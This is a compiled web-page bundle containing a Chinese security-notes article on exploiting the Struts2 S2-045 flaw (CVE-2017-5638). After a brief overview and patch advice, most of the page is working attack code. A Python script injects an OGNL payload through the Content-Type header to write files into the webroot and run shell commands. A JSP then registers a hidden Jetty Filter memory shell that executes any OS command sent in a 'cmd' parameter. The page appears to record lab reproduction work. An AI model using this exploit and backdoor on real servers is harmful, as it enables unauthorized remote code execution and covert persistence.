import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as i,o as e}from"./app-CFt4SMiv.js";const l={};function t(p,s){return e(),a("div",null,s[0]||(s[0]=[i(`<h1 id="s2-045内存马" tabindex="-1"><a class="header-anchor" href="#s2-045内存马"><span>s2-045内存马</span></a></h1><blockquote><p><a href="https://www.cnblogs.com/tide-sec/p/16304736.html" target="_blank" rel="noopener noreferrer">S2-045 写入内存马 - ccadmin - 博客园 (cnblogs.com)</a></p><p><a href="http://pirogue.org/2017/03/09/s2-045%E7%9C%9F%E6%AD%A3%E4%B8%80%E9%94%AEgetshell%E8%8F%9C%E5%88%80%E9%A9%AC-%E7%AA%81%E7%A0%B4%E4%BB%BB%E4%BD%95%E9%99%90%E5%88%B6/" target="_blank" rel="noopener noreferrer">s2-045真正一键getshell菜刀马-突破任何限制 | pirogue</a></p></blockquote><hr><h2 id="漏洞概述" tabindex="-1"><a class="header-anchor" href="#漏洞概述"><span>漏洞概述</span></a></h2><ul><li>漏洞编号: CVE-2017-5638 Struts2远程代码执行漏洞</li><li>漏洞类型: 远程代码执行漏洞</li><li>危险等级: 高危</li><li>利用条件: Struts2在受影响版本内，并包含Commons-FileUpload、Commons-IO库</li><li>受影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</li></ul><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。</p><p>Struts2在受影响版本内，并包含Commons-FileUpload、Commons-IO库时, 该漏洞能够通过构造恶意的 Content-Type 值来执行任意代码。 如果 Content-Type 值无效，则会抛出异常，并向用户显示错误消息，从而能够进一步获取服务器权限。</p><ul><li>安装官方补丁升级到最新版本: Struts 2.3.32 or Struts 2.5.10.1</li><li>临时修复方法: Struts2 默认使用 Jakarta 的 Common-FileUpload 文件上传解析器, 修改上传解析器为cos或pell。</li></ul><hr><h2 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析"><span>漏洞分析</span></a></h2><blockquote><p><a href="https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/S2-045%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.md" target="_blank" rel="noopener noreferrer">JavaSec/7.Struts2专区/S2-045漏洞分析/index.md at main · Y4tacker/JavaSec (github.com)</a></p></blockquote><hr><h2 id="命令执行写文件" tabindex="-1"><a class="header-anchor" href="#命令执行写文件"><span>命令执行写文件</span></a></h2><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> httpx</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> pathlib </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Path</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> urllib.parse</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 定义读取文件内容的函数</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> read_file</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">file_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">):</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    with</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(file_path, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;r&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">encoding</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;utf-8&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> file</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        return</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> file</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">read</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 读取 index.jsp 文件的内容</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">CURRENT_DIR</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> Path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">__file__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).parent</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># file_path = CURRENT_DIR / &#39;index.jsp&#39;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">file_path </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> CURRENT_DIR</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;testFile.txt&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">content </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;"> read_file</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(file_path)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># encoded_content = content.encode(&#39;utf-8&#39;)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">content_encoded </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> urllib.parse.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">quote</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(content)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 设置请求的 URL</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">url </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;http://192.168.1.215:8080/&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># filename = &quot;/index.jsp&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">filename </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;/testFile.txt&quot;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 设置请求头</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">headers </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;Upgrade-Insecure-Requests&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;User-Agent&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;Accept&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;Accept-Language&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;en-US,en;q=0.8,es;q=0.6&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;Connection&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;close&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;Content-Type&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;%{{(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ccccc=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;).getSession().getServletContext().getRealPath(&#39;/&#39;)).(#shell=&#39;{content_encoded}&#39;).(new java.io.BufferedWriter(new java.io.FileWriter(#path+&#39;{filename}&#39;).append(new java.net.URLDecoder().decode(#shell,&#39;UTF-8&#39;))).close()).(#cmd=&#39;echo \\\\\\&quot;write file to &#39;+#path+&#39;\\&quot;+ self.num +\\&quot;t00ls.jsp\\\\\\&quot;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}}:{{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">}}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">.multipart/form-data&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 发送 POST 请求</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">response </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> httpx.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">post</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(url, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">headers</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">headers)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 打印响应结果</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(response.status_code)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(response.text)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201522232.png" alt="image-20240920152239164"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201523134.png" alt="image-20240920152302098"></p><hr><h2 id="命令执行写-filter-内存马" tabindex="-1"><a class="header-anchor" href="#命令执行写-filter-内存马"><span>命令执行写 Filter 内存马</span></a></h2><p>适用于当前环境的 Filter 内存马:</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Method&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.Scanner&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.EnumSet&quot;%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    String filterName = &quot;myFilter&quot;;</span></span>
<span class="line"><span>    String urlPattern = &quot;/filter&quot;;</span></span>
<span class="line"><span>    Filter filter = new Filter() {</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void init(FilterConfig filterConfig) throws ServletException {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</span></span>
<span class="line"><span>            HttpServletRequest req = (HttpServletRequest) servletRequest;</span></span>
<span class="line"><span>            if (req.getParameter(&quot;cmd&quot;) != null) {</span></span>
<span class="line"><span>                boolean isLinux = true;</span></span>
<span class="line"><span>                String osTyp = System.getProperty(&quot;os.name&quot;);</span></span>
<span class="line"><span>                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {</span></span>
<span class="line"><span>                    isLinux = false;</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>                String[] cmds = isLinux ? new String[] {&quot;sh&quot;, &quot;-c&quot;, req.getParameter(&quot;cmd&quot;)} : new String[] {&quot;cmd.exe&quot;, &quot;/c&quot;, req.getParameter(&quot;cmd&quot;)};</span></span>
<span class="line"><span>                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span></span>
<span class="line"><span>                Scanner s = new Scanner( in ).useDelimiter(&quot;\\\\a&quot;);</span></span>
<span class="line"><span>                String output = s.hasNext() ? s.next() : &quot;&quot;;</span></span>
<span class="line"><span>                servletResponse.getWriter().write(output);</span></span>
<span class="line"><span>                servletResponse.getWriter().flush();</span></span>
<span class="line"><span>                return;</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>            filterChain.doFilter(servletRequest, servletResponse);</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void destroy() {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    };</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    Method threadMethod = Class.forName(&quot;java.lang.Thread&quot;).getDeclaredMethod(&quot;getThreads&quot;);</span></span>
<span class="line"><span>    threadMethod.setAccessible(true);</span></span>
<span class="line"><span>    Thread[] threads = (Thread[]) threadMethod.invoke(null);</span></span>
<span class="line"><span>    ClassLoader threadClassLoader = null;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    for (Thread thread:threads)</span></span>
<span class="line"><span>    {</span></span>
<span class="line"><span>        threadClassLoader = thread.getContextClassLoader();</span></span>
<span class="line"><span>        if(threadClassLoader != null){</span></span>
<span class="line"><span>            if(threadClassLoader.toString().contains(&quot;WebAppClassLoader&quot;)){</span></span>
<span class="line"><span>                Field fieldContext = threadClassLoader.getClass().getDeclaredField(&quot;_context&quot;);</span></span>
<span class="line"><span>                fieldContext.setAccessible(true);</span></span>
<span class="line"><span>                Object webAppContext = fieldContext.get(threadClassLoader);</span></span>
<span class="line"><span>                </span></span>
<span class="line"><span>                // 打印调试信息</span></span>
<span class="line"><span>                out.println(&quot;webAppContext class: &quot; + webAppContext.getClass().getName() + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                out.println(&quot;webAppContext superclass: &quot; + webAppContext.getClass().getSuperclass().getName() + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                </span></span>
<span class="line"><span>                try {</span></span>
<span class="line"><span>                    // 获取 _servletHandler 字段</span></span>
<span class="line"><span>                    Field fieldServletHandler = webAppContext.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;_servletHandler&quot;);</span></span>
<span class="line"><span>                    fieldServletHandler.setAccessible(true);</span></span>
<span class="line"><span>                    Object servletHandler = fieldServletHandler.get(webAppContext);</span></span>
<span class="line"><span>                    Field fieldFilters = servletHandler.getClass().getDeclaredField(&quot;_filters&quot;);</span></span>
<span class="line"><span>                    fieldFilters.setAccessible(true);</span></span>
<span class="line"><span>                    Object[] filters = (Object[]) fieldFilters.get(servletHandler);</span></span>
<span class="line"><span>                    boolean flag = false;</span></span>
<span class="line"><span>                    for(Object f:filters){</span></span>
<span class="line"><span>                        Field fieldName = f.getClass().getSuperclass().getDeclaredField(&quot;_name&quot;);</span></span>
<span class="line"><span>                        fieldName.setAccessible(true);</span></span>
<span class="line"><span>                        String name = (String) fieldName.get(f);</span></span>
<span class="line"><span>                        if(name.equals(filterName)){</span></span>
<span class="line"><span>                            flag = true;</span></span>
<span class="line"><span>                            break;</span></span>
<span class="line"><span>                        }</span></span>
<span class="line"><span>                    }</span></span>
<span class="line"><span>                    if(flag){</span></span>
<span class="line"><span>                        out.println(&quot;[-] Filter &quot; + filterName + &quot; exists.&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                        return;</span></span>
<span class="line"><span>                    }</span></span>
<span class="line"><span>                    out.println(&quot;[+] Add Filter: &quot; + filterName + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                    out.println(&quot;[+] urlPattern: &quot; + urlPattern + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();</span></span>
<span class="line"><span>                    Class sourceClazz = null;</span></span>
<span class="line"><span>                    Object holder = null;</span></span>
<span class="line"><span>                    Field field = null;</span></span>
<span class="line"><span>                    try{</span></span>
<span class="line"><span>                        sourceClazz = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.Source&quot;);</span></span>
<span class="line"><span>                        field = sourceClazz.getDeclaredField(&quot;JAVAX_API&quot;);</span></span>
<span class="line"><span>                        Method method = servletHandler.getClass().getMethod(&quot;newFilterHolder&quot;, sourceClazz);</span></span>
<span class="line"><span>                        holder = method.invoke(servletHandler, field.get(null));</span></span>
<span class="line"><span>                    }catch(ClassNotFoundException e){</span></span>
<span class="line"><span>                        sourceClazz = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.BaseHolder$Source&quot;);</span></span>
<span class="line"><span>                        Method method = servletHandler.getClass().getMethod(&quot;newFilterHolder&quot;, sourceClazz);</span></span>
<span class="line"><span>                        holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, &quot;JAVAX_API&quot;));</span></span>
<span class="line"><span>                    }</span></span>
<span class="line"><span>                    holder.getClass().getMethod(&quot;setName&quot;, String.class).invoke(holder, filterName);               </span></span>
<span class="line"><span>                    holder.getClass().getMethod(&quot;setFilter&quot;, Filter.class).invoke(holder, filter);</span></span>
<span class="line"><span>                    servletHandler.getClass().getMethod(&quot;addFilter&quot;, holder.getClass()).invoke(servletHandler, holder);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>                    Class  clazz         = classLoader.loadClass(&quot;org.eclipse.jetty.servlet.FilterMapping&quot;);</span></span>
<span class="line"><span>                    Object filterMapping = clazz.newInstance();</span></span>
<span class="line"><span>                    Method method        = filterMapping.getClass().getDeclaredMethod(&quot;setFilterHolder&quot;, holder.getClass());</span></span>
<span class="line"><span>                    method.setAccessible(true);</span></span>
<span class="line"><span>                    method.invoke(filterMapping, holder);</span></span>
<span class="line"><span>                    filterMapping.getClass().getMethod(&quot;setPathSpecs&quot;, String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});</span></span>
<span class="line"><span>                    filterMapping.getClass().getMethod(&quot;setDispatcherTypes&quot;, EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));</span></span>
<span class="line"><span>                    servletHandler.getClass().getMethod(&quot;prependFilterMapping&quot;, filterMapping.getClass()).invoke(servletHandler, filterMapping);</span></span>
<span class="line"><span>                } catch (NoSuchFieldException e) {</span></span>
<span class="line"><span>                    out.println(&quot;Error: &quot; + e.getMessage() + &quot;&lt;br&gt;&quot;);</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }     </span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>和上一步写文件的操作一样, 将此 JSP 内容写入到 webapp 目录下, 访问此文件对应 URL, 第二次访问如果注册成功会输出 <code>Filter myFilter exists</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201526590.png" alt="image-20240920152602531"></p><p>然后使用注入的 filter 路由执行命令即可:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202409201526648.png" alt="image-20240920152653579"></p><hr><h2 id="servlet马" tabindex="-1"><a class="header-anchor" href="#servlet马"><span>Servlet马</span></a></h2><blockquote><p>TODO: vulhub docker 没复现出来, 暂且搁置</p><p><a href="https://www.cnblogs.com/tide-sec/p/16304736.html" target="_blank" rel="noopener noreferrer">S2-045 写入内存马 - ccadmin - 博客园 (cnblogs.com)</a></p></blockquote><hr><h2 id="其他内存马" tabindex="-1"><a class="header-anchor" href="#其他内存马"><span>其他内存马</span></a></h2><ul><li><p>Github 全局搜索找到的一个 Struts2 内存马, 但是没看出来作用:</p><p><a href="https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/JYso/template/memshellStatic/struts2/Struts2ActionMS.java" target="_blank" rel="noopener noreferrer">JYso/src/main/java/com/qi4l/JYso/template/memshellStatic/struts2/Struts2ActionMS.java at master · qi4L/JYso (github.com)</a></p></li></ul>`,30)]))}const c=n(l,[["render",t],["__file","s2-045内存马.html.vue"]]),o=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Struts2%E5%86%85%E5%AD%98%E9%A9%AC/s2-045%E5%86%85%E5%AD%98%E9%A9%AC.html","title":"s2-045内存马","lang":"zh-CN","frontmatter":{"category":["网络安全","Web安全","Java"],"tags":["内存马","Struts2"],"description":"s2-045内存马 S2-045 写入内存马 - ccadmin - 博客园 (cnblogs.com) s2-045真正一键getshell菜刀马-突破任何限制 | pirogue 漏洞概述 漏洞编号: CVE-2017-5638 Struts2远程代码执行漏洞 漏洞类型: 远程代码执行漏洞 危险等级: 高危 利用条件: Struts2在受影响版本内...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Struts2%E5%86%85%E5%AD%98%E9%A9%AC/s2-045%E5%86%85%E5%AD%98%E9%A9%AC.html"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"s2-045内存马"}],["meta",{"property":"og:description","content":"s2-045内存马 S2-045 写入内存马 